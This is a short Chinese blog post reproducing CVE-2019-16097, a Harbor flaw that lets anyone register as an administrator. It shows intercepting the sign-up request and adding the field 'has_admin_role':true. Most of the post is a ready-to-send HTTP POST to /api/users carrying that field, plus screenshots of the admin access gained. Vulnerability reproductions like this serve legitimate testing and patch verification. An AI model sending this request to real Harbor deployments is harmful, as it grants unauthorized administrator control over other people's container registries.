# Harbor 任意管理员注册漏洞复现 CVE-2019-16097 - mrhonest - 博客园

> 原文：[`www.cnblogs.com/mrhonest/p/11561619.html`](https://www.cnblogs.com/mrhonest/p/11561619.html)

### 注册时抓包

![](img/acd433647e412e5d9b86e4fd34b264ed.png)

### 添加 poc

```
"has_admin_role":true 
```

![](img/e29434f6c01f3c10c95ef72e38dce9eb.png)

### 管理员权限

![](img/6fb1e8ef2d0b509e75f72c0211940621.png)

### POC

```
POST /api/users HTTP/1.1
Host: 127.0.0.1
Content-Length: 131
Accept: application/json
Origin: http://127.0.0.1
User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
Content-Type: application/json
Referer: http://127.0.0.1/harbor/sign-in
Accept-Language: zh-CN,zh;q=0.9
Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81
Connection: close

{"username":"mrhonest","email":"mrhonest@qq.com","realname":"mrhonest","password":"111111Aaa","comment":"11111","has_admin_role":true} 
```